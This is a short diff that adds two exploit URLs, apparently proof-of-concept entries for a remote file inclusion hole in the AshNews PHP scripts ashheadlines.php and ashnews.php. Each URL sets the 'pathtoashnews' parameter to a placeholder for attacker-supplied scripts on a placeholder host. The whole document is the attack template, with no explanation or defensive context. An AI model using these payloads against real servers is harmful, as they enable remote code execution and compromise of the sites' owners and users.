@@ -1,0 +1,3 @@
+http://www.example.com/[ashnews_path]/ashheadlines.php?pathtoashnews=[evil_scripts]
+
+http://www.example.com/[ashnews_path]/ashnews.php?pathtoashnews=[evil_scripts]
